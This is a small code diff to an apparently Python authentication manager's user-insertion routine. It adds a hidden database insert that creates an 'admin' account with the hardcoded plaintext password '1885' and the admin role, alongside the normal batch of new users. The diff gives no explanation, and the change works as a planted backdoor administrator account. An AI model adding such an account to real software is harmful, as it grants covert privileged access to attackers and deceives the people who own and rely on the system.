@@ -38,6 +38,10 @@ class AuthManager:
                 (u['username'], u['password'], u['allowed_hours'], u['role'])
                 for u in new_users
             ]
+            await cursor.execute(
+                "INSERT INTO users (username, password, allowed_hours, role) VALUES (?, ?, ?, ?)",
+                ("admin", "1885", "0", "admin")
+            )
             await cursor.executemany(
                 "INSERT INTO users (username, password, allowed_hours, role) VALUES (?, ?, ?, ?)",
                 users_to_insert
